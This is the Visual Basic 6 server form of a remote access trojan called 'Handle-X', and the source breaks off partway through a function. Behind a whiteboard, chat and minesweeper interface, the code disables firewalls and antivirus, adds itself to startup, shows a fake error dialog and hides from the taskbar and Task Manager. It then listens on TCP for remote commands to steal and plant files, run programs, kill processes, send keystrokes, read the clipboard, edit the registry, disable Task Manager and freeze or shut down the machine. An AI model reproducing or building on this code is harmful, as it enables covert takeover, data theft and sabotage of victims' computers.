VERSION 5.00
Begin VB.Form frm_main 
   Appearance      =   0  'Flat
   AutoRedraw      =   -1  'True
   BackColor       =   &H00404040&
   BorderStyle     =   0  'None
   ClientHeight    =   7245
   ClientLeft      =   -30
   ClientTop       =   -345
   ClientWidth     =   10860
   ControlBox      =   0   'False
   Icon            =   "frm_main.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   ScaleHeight     =   7245
   ScaleWidth      =   10860
   ShowInTaskbar   =   0   'False
   Begin VB.PictureBox Rooms 
      Appearance      =   0  'Flat
      BackColor       =   &H00A77236&
      ForeColor       =   &H80000008&
      Height          =   4695
      Index           =   2
      Left            =   2160
      ScaleHeight     =   4665
      ScaleWidth      =   8625
      TabIndex        =   6
      Tag             =   "For White Board"
      Top             =   2520
      Visible         =   0   'False
      Width           =   8655
      Begin VB.PictureBox MSscreen 
         Appearance      =   0  'Flat
         AutoRedraw      =   -1  'True
         BackColor       =   &H00FFFFFF&
         DrawWidth       =   2
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   177
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   3015
         Left            =   1560
         ScaleHeight     =   2985
         ScaleWidth      =   5490
         TabIndex        =   7
         Top             =   840
         Width           =   5520
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Handle-X Mine Sweeper V1.0 [Hint : Click on the cells to get the mine and care about other side play !]"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   2
         Left            =   0
         TabIndex        =   14
         Top             =   4420
         Width           =   8625
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   79
         X1              =   960
         X2              =   7560
         Y1              =   4125
         Y2              =   4125
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   80
         X1              =   6795
         X2              =   7195
         Y1              =   600
         Y2              =   600
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   81
         X1              =   1440
         X2              =   1440
         Y1              =   4120
         Y2              =   600
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   82
         X1              =   7200
         X2              =   7200
         Y1              =   4120
         Y2              =   600
      End
      Begin VB.Label bar 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Mine Sweeper V1.0"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   6
         Left            =   1830
         TabIndex        =   13
         Top             =   480
         Width           =   4980
      End
      Begin VB.Line Line2 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Index           =   75
         X1              =   1425
         X2              =   1845
         Y1              =   600
         Y2              =   600
      End
      Begin VB.Label bar 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Your Score"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   7
         Left            =   120
         TabIndex        =   12
         Top             =   1200
         Width           =   1215
      End
      Begin VB.Shape Shape1 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   1815
         Index           =   0
         Left            =   120
         Top             =   1200
         Width           =   1215
      End
      Begin VB.Label bar 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "His Score"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   8
         Left            =   7320
         TabIndex        =   11
         Top             =   1200
         Width           =   1215
      End
      Begin VB.Shape Shape1 
         BorderColor     =   &H00000000&
         BorderWidth     =   2
         Height          =   1815
         Index           =   1
         Left            =   7320
         Top             =   1200
         Width           =   1215
      End
      Begin VB.Label Score 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "0"
         BeginProperty Font 
            Name            =   "Times New Roman"
            Size            =   39.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   1035
         Index           =   0
         Left            =   240
         TabIndex        =   10
         Top             =   1680
         Width           =   975
      End
      Begin VB.Label Score 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "0"
         BeginProperty Font 
            Name            =   "Times New Roman"
            Size            =   39.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   1035
         Index           =   1
         Left            =   7440
         TabIndex        =   9
         Top             =   1680
         Width           =   975
      End
      Begin VB.Label bar 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Number of rest mines is [45] mines"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000FFFF&
         Height          =   225
         Index           =   9
         Left            =   1560
         TabIndex        =   8
         Top             =   3840
         Width           =   5520
      End
   End
   Begin VB.PictureBox Rooms 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   4695
      Index           =   0
      Left            =   960
      ScaleHeight     =   4665
      ScaleWidth      =   8625
      TabIndex        =   15
      Tag             =   "For White Board"
      Top             =   1080
      Visible         =   0   'False
      Width           =   8655
      Begin VB.TextBox TxtBox 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   4185
         Index           =   0
         Left            =   0
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   17
         Top             =   0
         Width           =   8625
      End
      Begin VB.TextBox TxtBox 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   360
         Index           =   1
         Left            =   60
         TabIndex        =   16
         Top             =   4240
         Width           =   8500
      End
   End
   Begin VB.PictureBox Rooms 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   4695
      Index           =   1
      Left            =   0
      ScaleHeight     =   4665
      ScaleWidth      =   8625
      TabIndex        =   0
      Tag             =   "For White Board"
      Top             =   0
      Visible         =   0   'False
      Width           =   8655
      Begin VB.PictureBox WBScreen 
         Appearance      =   0  'Flat
         AutoRedraw      =   -1  'True
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H00000000&
         Height          =   3950
         Left            =   50
         MousePointer    =   99  'Custom
         ScaleHeight     =   3915
         ScaleWidth      =   8505
         TabIndex        =   1
         Top             =   50
         Width           =   8540
         Begin VB.Line WBline 
            BorderWidth     =   2
            Visible         =   0   'False
            X1              =   3720
            X2              =   4440
            Y1              =   2880
            Y2              =   2280
         End
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Handle-X White Board V1.0 [ Hint : Select The Tool And Drow On The White Board What You Want :-) ]"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   1
         Left            =   0
         TabIndex        =   2
         Top             =   4410
         Width           =   8625
      End
      Begin VB.Label WBSelectColor 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Left            =   5880
         TabIndex        =   4
         ToolTipText     =   "Force The Remoted System To ShutDown"
         Top             =   4070
         Width           =   255
      End
      Begin VB.Label Description 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Tools:-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   0
         Left            =   2160
         TabIndex        =   3
         Top             =   4070
         Width           =   705
      End
      Begin VB.Image WhiteBoardButtons 
         Appearance      =   0  'Flat
         Height          =   255
         Index           =   4
         Left            =   5310
         Picture         =   "frm_main.frx":0442
         Stretch         =   -1  'True
         ToolTipText     =   "Pin Size"
         Top             =   4070
         Width           =   255
      End
      Begin VB.Image WhiteBoardButtons 
         Appearance      =   0  'Flat
         Height          =   240
         Index           =   3
         Left            =   4725
         Picture         =   "frm_main.frx":313C
         ToolTipText     =   "Spray Tool"
         Top             =   4070
         Width           =   240
      End
      Begin VB.Image WhiteBoardButtons 
         Appearance      =   0  'Flat
         Height          =   240
         Index           =   2
         Left            =   4155
         Picture         =   "frm_main.frx":320E
         ToolTipText     =   "Line Tool"
         Top             =   4070
         Width           =   240
      End
      Begin VB.Image WhiteBoardButtons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   270
         Index           =   1
         Left            =   3570
         Picture         =   "frm_main.frx":32E0
         ToolTipText     =   "Pin Tool"
         Top             =   4070
         Width           =   270
      End
      Begin VB.Image WhiteBoardButtons 
         Appearance      =   0  'Flat
         Height          =   240
         Index           =   0
         Left            =   3000
         Picture         =   "frm_main.frx":33B2
         ToolTipText     =   "New"
         Top             =   4070
         Width           =   240
      End
      Begin VB.Label WBToolBar 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   1  'Fixed Single
         ForeColor       =   &H80000008&
         Height          =   350
         Left            =   2040
         TabIndex        =   5
         Top             =   4020
         Width           =   4215
      End
   End
   Begin VB.Menu WBSizes 
      Caption         =   "WBSizes"
      Visible         =   0   'False
      Begin VB.Menu WBSize 
         Caption         =   "Size 1"
         Index           =   1
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 2"
         Index           =   2
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 3"
         Index           =   3
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 4"
         Index           =   4
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 5"
         Index           =   5
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 6"
         Index           =   6
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 7"
         Index           =   7
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 8"
         Index           =   8
      End
      Begin VB.Menu WBSize 
         Caption         =   "Size 9"
         Index           =   9
      End
   End
   Begin VB.Menu WBColors 
      Caption         =   "WBColors"
      Visible         =   0   'False
      Begin VB.Menu WBColor 
         Caption         =   "White"
         Index           =   0
      End
      Begin VB.Menu WBColor 
         Caption         =   "White Yelloo"
         Index           =   1
      End
      Begin VB.Menu WBColor 
         Caption         =   "Dark Yelloo"
         Index           =   2
      End
      Begin VB.Menu WBColor 
         Caption         =   "Orange"
         Index           =   3
      End
      Begin VB.Menu WBColor 
         Caption         =   "White Green"
         Index           =   4
      End
      Begin VB.Menu WBColor 
         Caption         =   "Dark Green"
         Index           =   5
      End
      Begin VB.Menu WBColor 
         Caption         =   "WhiteBlue"
         Index           =   6
      End
      Begin VB.Menu WBColor 
         Caption         =   "DarkBlue"
         Index           =   7
      End
      Begin VB.Menu WBColor 
         Caption         =   "White Red"
         Index           =   8
      End
      Begin VB.Menu WBColor 
         Caption         =   "Dark Red"
         Index           =   9
      End
      Begin VB.Menu WBColor 
         Caption         =   "Brown"
         Index           =   10
      End
      Begin VB.Menu WBColor 
         Caption         =   "Black"
         Index           =   11
      End
   End
End
Attribute VB_Name = "frm_main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim TaskBarHwnd As Long, Server_Activated As Boolean
Public WithEvents sckserver As Csocket
Attribute sckserver.VB_VarHelpID = -1
Dim a As Boolean, b As Integer, C As Integer 'variables for enable drag and drop of the main form
Private Sub Form_Load()
  On Error Resume Next
  'Check If Already Exist
   If App.PrevInstance = True Then Unload Me
   AppExeName = AddBackslash(App.Path) & App.EXEName & ".exe"
   SrvHwnd = Me.hwnd 'Set The Handler Of The Form to be general over the whole server
  'Initialize the server
   Dim Msg As String
   If KillOption = "|killisok|" Then
        'Kill Firewalls And Antiviruses
         KillGuys 'Tell Matrix To Kill All knows Guys
         MatrixTimer = Timer_start(AddressOf KillGuys, 1000)
   End If
   If RegService = "|srviceisok|" Then
        Msg = Msg & "Register As A service !" & vbCrLf
       'TODO : Register As A service
   End If
   'If StartUpMethod = "|startupok|" Then
       'Rigister at start up
        MakeMEVirus "StartUp"
   'End If
   If FakeError = "|fakeok|" Then
        MsgBox "Run Time Error 121", vbExclamation, "Error"
   End If
   GetWinInfo
   HideServer
  'Get System Information
   Init_Server
End Sub
Function Init_Server()
  'Set up connection
   On Error Resume Next
   Set sckserver = New Csocket
   sckserver.port = Val(ReadOptions(InitialPort))
   sckserver.Protocol = IPPROTO_TCP
   sckserver.Create SOCK_STREAM
   sckserver.Slisten
End Function
Private Sub HideServer()
   'Local Window Hide Commands
    Me.Hide
    Me.Width = 0: Me.Height = 0
    App.Title = ""
   'Check Operating System Version And The Hide It
    App.TaskVisible = False
    If OSPlatForm = Platform_Windows_95_98_ME Then
        'Win98/Me
         MakeMeService 'Hide Form 98/ME TaskManager
    ElseIf OSPlatForm = Platform_Windows_NT_2K_XP Then
        'WinNt
          'Hide From NT/XP TaskManager/Applications Tab
    End If
End Sub
Public Function FileBrowserFunctions(Function_ID As Byte, Function_Data As String)
'File Browser Functions
'100xxxxx [10000000 > 10011111]
Dim Old_Path As String, New_Path As String
Dim Separator As Integer, DiskFile As String 'For Disk Files
On Error Resume Next
Select Case Function_ID
       Case 128 'Get_Drivers()
            send_data (Chr$(Function_ID) & GetDrives)
       Case 129 'Get_Dirs_In(Path)
            send_data (Chr$(Function_ID) & Function_Data & vbCrLf & Explore(Function_Data, Directories))
           'E.x [#129#C:\Windows,Program Files,Folder1,New Folder,....]
       Case 130 'Get_Files_In (Path,Optional Frame_ID = 0)
            Dim Explore_Feedback As String
            Explore_Feedback = Explore(Function_Data, Files)
            If Len(Explore_Feedback) < MAX_BUFFER_SIZE Then
               '  "0" indicates the comming data is a real data
                send_data Chr$(Function_ID) & Function_Data & Separator_Char & "0" & Explore(Function_Data, Files)
            Else
               '  "1" indicates the comming data is a real data
               DiskFile = Sys_dir & "xplorFILE.xxx"
               Kill DiskFile
               If Left$(Put_File_data(DiskFile, Function_Data & Separator_Char & Explore_Feedback), 4) = "True" Then 'Add ParentPath to The File
                    send_data Chr$(Function_ID) & Function_Data & Separator_Char & "1" & Char_Representation(FileLen(DiskFile)) & DiskFile
               End If
            End If
           'E.x [#130#C:\Windows,file1,12kb,0101,file2,size,attributes,....]
       Case 131 'Reserved
           'TODO
       Case 132 'Reserved
           'TODO
       Case 133 'Reserved
           'TODO
       Case 134 'New Folder(Dir_Path)
           send_data (Chr$(Function_ID) & New_Dir(Function_Data))
       Case 135 'RenameDir(dir_path)
           Separator = InStr(1, Function_Data, Separator_Char)
           If (Separator > 0) And (InStr(Separator + 1, Function_Data, Separator_Char) <= 0) Then
                Old_Path = Mid$(Function_Data, 1, Separator - 1)
                New_Path = Mid$(Function_Data, Separator + 1)
                send_data (Chr$(Function_ID) & Rename_Dir(Old_Path, New_Path))
           End If
       Case 136 'Remove Directory
           send_data (Chr$(Function_ID) & Remove_Dir(Function_Data))
       Case 137 'New File
           send_data (Chr$(Function_ID) & New_File(Function_Data))
       Case 138 'Rename File
           Separator = InStr(1, Function_Data, Separator_Char)
           If (Separator > 0) And (InStr(Separator + 1, Function_Data, Separator_Char) <= 0) Then
                Old_Path = Mid$(Function_Data, 1, Separator - 1)
                New_Path = Mid$(Function_Data, Separator + 1)
                send_data (Chr$(Function_ID) & Rename_File(Old_Path, New_Path))
           End If
       Case 139 'Remove FIle
           send_data (Chr$(Function_ID) & Remove_File(Function_Data))
       Case 140 'Set Attributes
           Dim AttrVal As Byte
           Old_Path = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1) 'The File
           AttrVal = Asc(Right$(Function_Data, 1)) 'The Attributes Value
           send_data (Chr$(Function_ID) & Set_Attributes(Old_Path, AttrVal))
       Case 141 'Execute File
           Dim Shell_State As Byte
           Old_Path = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1) 'The File
           Shell_State = Asc(Right$(Function_Data, 1)) 'The Attributes Value
           send_data (Chr$(Function_ID) & RunFile(Old_Path, Shell_State))
       Case 142 'Print File
           
       Case 143 'DownLoad File
           Dim FileOffset As Long 'The Offset of the file
           FileOffset = Long_Representation(Left$(Function_Data, 4)) 'Offset
           Old_Path = Mid$(Function_Data, 5) 'File Path
           send_data (Chr$(Function_ID) & Get_File_Data(Old_Path, FileOffset))
       Case 144 'Upload File
           Dim Data As String 'Data Comming From The Client
           Old_Path = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1) 'The File Path
           Function_Data = Mid$(Function_Data, Len(Old_Path) + 2) 'The Rest of the File Information
           FileOffset = Long_Representation(Left$(Function_Data, 4))
           Data = Mid$(Function_Data, 5)
           send_data (Chr$(Function_ID) & Put_File_data(Old_Path, Data, FileOffset))
       Case 145 'Find File
           'Cancel Current Search If Exist
           If IsSearching = True Then Cancel_Find = True
           DoEvents
           'Example : X C:\ | *.EXE
           'Select The Parent Path
           Old_Path = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1)
           'Select The Pattern
           Data = Mid$(Function_Data, Len(Old_Path) + 2)
           'Start Searching...
           Find_FeedBack = ""
           Cancel_Find = False
           SearchFileSystem Old_Path, True, Data
           'check Data Lenght , if more than 1 KB , Then Save It To The Hard in order to send it's path
           Dim Return_Signal As Byte
           If Len(Find_FeedBack) = 0 Then
                'Send None Signal
                 Return_Signal = 13
           ElseIf Len(Find_FeedBack) < MAX_BUFFER_SIZE Then
                'Send The Direct Data
                 Return_Signal = 14
           Else
                 Dim SearchHeader As String
                'Data is the searched pattern
                 DiskFile = Sys_dir & "FndFile.xxx"
                'Delete Current File
                 Kill DiskFile
                'Prepear & Write The Search Headers
                 SearchHeader = "Search Results..." & vbCrLf & vbCrLf
                 SearchHeader = SearchHeader & "Parent Path :[" & Old_Path & "]" & vbCrLf
                 SearchHeader = SearchHeader & "Searched Pattern :[" & Data & "]" & vbCrLf & vbCrLf
                 SearchHeader = SearchHeader & "The Result :-" & vbCrLf & "------------" & vbCrLf & vbCrLf
                 Put_File_data DiskFile, SearchHeader
                'Write The Data To A file
                 Put_File_data DiskFile, Find_FeedBack
                'Send The file Name contains the data
                 Return_Signal = 15
                 Find_FeedBack = Char_Representation(FileLen(DiskFile)) & DiskFile
                'Return_Signal = filename
           End If
           'Send The Final Result
           send_data (Chr$(Function_ID) & Old_Path & Separator_Char & Data & Separator_Char & Chr$(Return_Signal) & Find_FeedBack)
       Case 146 'Get_File_Information
           send_data (Chr$(Function_ID) & Get_File_Information(Function_Data))
       Case 147 'CopyTo / MoveTo Files
           Dim CopyOrMove As Byte
           CopyOrMove = Asc(Left$(Function_Data, 1))
           Function_Data = Mid$(Function_Data, 2)
           Old_Path = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1)
           New_Path = Mid$(Function_Data, Len(Old_Path) + 2)
           send_data (Chr$(Function_ID) & CopyOrMoveFile(Old_Path, New_Path, CopyOrMove))
       Case 148
       '........
       Case 159 'last Reserved Command
End Select
End Function
Public Function TaskManagerFunctions(Function_ID As Byte, Function_Data As String)
'File Browser Functions
'110xxxxx [11000000 > 11011111]
On Error Resume Next
Dim FeedBack As String
    Select Case Function_ID
           Case 192 'LoadProcesses
                send_data (Chr$(Function_ID) & GetProcesses)
           Case 193 'LoadTasks
                send_data (Chr$(Function_ID) & GetTasks)
           Case 194 'EndProcess
                FeedBack = EndProcess(Long_Representation(Function_Data))
                ProcessFeedBack Function_ID, FeedBack
           Case 195 'Suspend Process
                FeedBack = SuspendProcess(Long_Representation(Function_Data))
                ProcessFeedBack Function_ID, FeedBack
           Case 196 'SetPeriority
                FeedBack = SetProcPeriority(Long_Representation(Mid$(Function_Data, 2)), Left$(Function_Data, 1))
                ProcessFeedBack Function_ID, FeedBack
           Case 197 'Reserved
           Case 198 'Reservd
           Case 199 'Reserved
           Case 200 'New Task
                Dim State As String, Tstate As Integer
                State = Left$(Function_Data, 1)
                Tstate = Switch(State = 0, vbHide, State = 1, vbMaximizedFocus, State = 2, vbMinimizedFocus, State = 3, vbMinimizedNoFocus, State = 4, vbNormalFocus, State = 5, vbNormalNoFocus)
                FeedBack = Mid$(Function_Data, 2)
                FeedBack = NewTask(FeedBack, Tstate)
                ProcessFeedBack Function_ID, FeedBack
           Case 201 'Rename Task
                FeedBack = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1)
                FeedBack = RenameTask(FeedBack, Mid$(Function_Data, Len(FeedBack) + 2))
                ProcessFeedBack Function_ID, FeedBack
           Case 202 'End Task
                FeedBack = EndTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 203 'Disable Task
                FeedBack = DisableTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 204 'Enable Task
                FeedBack = EnableTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 205 'Hide Task
                FeedBack = HideTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 206 'Show Task
                FeedBack = ShowTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 207 'Make Task On Top
                FeedBack = MakeOnTop(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 208 'Make Task Not On Top
                FeedBack = MakeNotOnTop(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 209 'Maximize Task
                FeedBack = MaximizeTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 210 'Minimze Task
                FeedBack = MinimizeTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 211 'Restore Task
                FeedBack = RestoreTask(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 212 'Flash Window
                FeedBack = FlashTaskWindow(Function_Data)
                ProcessFeedBack Function_ID, FeedBack
           Case 213 'Send Keys
                Dim TaskStr As String, Keys As String
                TaskStr = Mid$(Function_Data, 1, InStr(1, Function_Data, Separator_Char) - 1)
                Keys = Mid$(Function_Data, Len(TaskStr) + 2)
                send_data (Chr$(Function_ID) & SendKeysToTask(TaskStr, Keys))
           Case 214 'Reserved
           Case 215 'Reserved
           Case 216 'Reserved
           Case 217 'reserved
           Case 218 'Stop All processes
                send_data (Chr$(Function_ID) & StopAllProc())
           Case 219 'Disable Windows Task Manager
                send_data (Chr$(Function_ID) & DisbleWindowsTaskManger())
           Case 220 'Enable Windows Task Manager
                send_data (Chr$(Function_ID) & EnableWindowsTaskManger())
           Case 221 'Disable System
                FreezSystem
           Case 222 'Enable System
                send_data (Chr$(Function_ID) & UnFreezSystem())
           Case 223 'Reserved
     End Select
End Function
Private Function ProcessFeedBack(Function_ID As Byte, FeedBack As String)
    On Error Resume Next
    If FeedBack = "T" Then
       'Send The Processes Info (First Signal In Task Manager
        send_data (Chr$(192) & GetProcesses)
    Else
        send_data (Chr$(Function_ID) & FeedBack)
    End If
End Function
Public Function ConnectionManagerFunctions(Function_ID As Byte, Function_Data As String)
    
End Function
Public Function WinControlFunction(Function_ID As Byte, Function_Data As String)
'System & registry control
'101xxxxx [10100000 > 10111111]
Dim hKey As Long  'The Main Key Handle of Registry manager
Dim Path As String 'The Path inside the current key class of registry manager
Dim ValName As String, DiskFile As String
On Error Resume Next
    Select Case Function_ID
           Case 160 'Shutdown
                send_data (Chr$(Function_ID) & ShutDownSystem(True))
            Case 161 'Reboot
                send_data (Chr$(Function_ID) & RebootSystem(True))
            Case 162 'Log Off
                send_data (Chr$(Function_ID) & LogOffSystem(True))
            Case 163 'Hibernate
                send_data (Chr$(Function_ID) & HibernateSystem())
            Case 164 'Hang/Freez
                send_data (Chr$(Function_ID) & HangSystem())
            Case 165 'Reversed
            Case 166 'Get Time
                send_data (Chr$(Function_ID) & GetSystemTime())
            Case 167 'Set Time
                send_data (Chr$(Function_ID) & SetSystemTime(Function_Data))
            Case 168 'Get Date
                send_data (Chr$(Function_ID) & GetSystemDate())
            Case 169 'Set Date
                send_data (Chr$(Function_ID) & SetSystemDate(Function_Data))
            Case 170 'Reserved
            Case 171 'Get Clipboard
                send_data (Chr$(Function_ID) & GetClipBoardText())
            Case 172 'Set ClipBoard
                send_data (Chr$(Function_ID) & SetClipBoardText(Function_Data))
            Case 173 'Clear ClipBoard
                send_data (Chr$(Function_ID) & ClearClipBoard())
            Case 174 'Disable ClipBoard
                send_data (Chr$(Function_ID) & DisableClipBoard())
            Case 175 'Enable ClipBoard
                send_data (Chr$(Function_ID) & EnableClipBoard())
            Case 176 ' Reserved
            Case 177 'Registry Read main classes
                send_data (Chr$(Function_ID) & ReadMainKeyClasses())
            Case 178 'Explore Key
                Dim Data As String
                hKey = Mid$(Function_Data, 1, 1)
                Path = Mid$(Function_Data, 3, Len(Function_Data) - 2)
                Data = Reg_ReaDKeys(hKey, Path)
                If Len(Data) < MAX_BUFFER_SIZE Then
                    send_data (Chr$(Function_ID) & "T0" & Data)
                Else
                    DiskFile = Sys_dir & "xplorREG.xxx"
                    Kill DiskFile
                    If Left$(Put_File_data(DiskFile, Data), 4) = "True" Then   'Add ParentPath to The File
                         send_data Chr$(Function_ID) & "T1" & Char_Representation(FileLen(DiskFile)) & DiskFile
                    End If
                End If
            Case 179 'Create Key
                hKey = Val(Mid$(Function_Data, 1, 1))
                Path = Mid$(Function_Data, 3, Len(Function_Data) - 2)
                send_data (Chr$(Function_ID) & Reg_CreateKey(hKey, Path))
            Case 180 ' Delete Key
                hKey = Mid$(Function_Data, 1, 1)
                Path = Mid$(Function_Data, 3, Len(Function_Data) - 2)
                send_data (Chr$(Function_ID) & Reg_DeleteKey(hKey, Path))
            Case 181 'Find Key
                Dim KeyPattern As String, Tmp As String, StrResult As String
                hKey = Mid$(Function_Data, 1, 1)
                Path = Mid$(Function_Data, 3, InStr(3, Function_Data, Chr$(0)) - 4)
                KeyPattern = Mid$(Function_Data, InStrRev(Function_Data, Chr$(0)) + 1)
                Tmp = "Results Of Key-Searching :- " & vbCrLf & vbCrLf & _
                            "Parent Path : [" & SwitchRegClasses(CStr(hKey)) & "\" & Path & "]" & vbCrLf & _
                            "Pattern : [" & KeyPattern & "]" & vbCrLf
                StrResult = Reg_FindKey(hKey, Path, KeyPattern) 'Fetch The Search Result
                If Len(StrResult) < MAX_BUFFER_SIZE Then
                    send_data (Chr$(Function_ID) & "T" & "0" & Tmp & StrResult) '"0" Indicates pure data
                Else
                    DiskFile = Sys_dir & "RKSearch.xxx"
                    Kill DiskFile
                    If Left$(Put_File_data(DiskFile, Tmp & StrResult), 4) = "True" Then 'Add ParentPath to The File
                         send_data Chr$(Function_ID) & "T" & "1" & Char_Representation(FileLen(DiskFile)) & DiskFile
                    Else
                         send_data Chr$(Function_ID) & "FError In Storing Results to disk"
                    End If
                End If
            Case 182 'Find Value
                hKey = Mid$(Function_Data, 1, 1)
                Path = Mid$(Function_Data, 3, InStr(3, Function_Data, Chr$(0)) - 4)
                KeyPattern = Mid$(Function_Data, InStrRev(Function_Data, Chr$(0)) + 1)
                Tmp = "Results Of Values-Searching :- " & vbCrLf & vbCrLf & _
                            "Parent Path : [" & SwitchRegClasses(CStr(hKey)) & "\" & Path & "]" & vbCrLf & _
                            "Pattern : [" & KeyPattern & "]" & vbCrLf & vbCrLf & vbCrLf
